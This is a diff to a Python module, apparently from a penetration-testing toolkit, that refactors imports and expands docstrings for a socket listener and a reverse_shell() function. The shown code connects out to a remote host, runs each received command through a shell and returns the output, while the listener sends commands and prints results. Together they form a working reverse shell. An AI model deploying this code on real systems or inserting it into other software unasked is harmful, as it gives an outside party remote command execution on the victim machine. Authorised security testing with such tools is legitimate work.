@@ -1,14 +1,21 @@
-import os
 import socket
-import subprocess
-import select
+from subprocess import run
+from select import select
+
+"""
+Used for custom scripts / exploits during intrusive security tests.
+"""
 
 
 def listener(local_host: str, local_port: int, buffer_size: int = 1024, carriage_return: str = '\n') -> None:
     """
-    Works with netcat and reverse_shell().
-    Carriage return is an option because different OS may expect different values.
-    Unix typically '\n'. Windows '\r\n'.
+    Accept incoming connections from a remote host.
+    Run system commands to the remote host.
+
+    Notes:
+        - Works with netcat and reverse_shell().
+        - Carriage return is an option because different OS may expect different values.
+        - Unix typically '\n'. Windows '\r\n'.
     """
 
     try:
@@ -32,7 +39,7 @@ def listener(local_host: str, local_port: int, buffer_size: int = 1024, carriage
                 break
 
             # Confirm data is being sent with a timeout
-            ready = select.select([client_socket], [], [], 5)
+            ready = select([client_socket], [], [], 5)
             if ready[0]:
                 output = client_socket.recv(buffer_size).decode()
                 print(output)
@@ -46,6 +53,9 @@ def listener(local_host: str, local_port: int, buffer_size: int = 1024, carriage
 
 def reverse_shell(remote_host: str, remote_port: int, buffer_size: int = 1024) -> None:
     """
+    Opens a connection to a remote host.
+    Allows remote host to execute OS commands on local system.
+
     Works with listener().
     """
 
@@ -63,7 +73,7 @@ def reverse_shell(remote_host: str, remote_port: int, buffer_size: int = 1024) -
             break
 
         try:
-            os_call = subprocess.run(command, shell=True, capture_output=True)
+            os_call = run(command, shell=True, capture_output=True)
 
             if os_call.returncode == 0:
                 s.send(os_call.stdout)
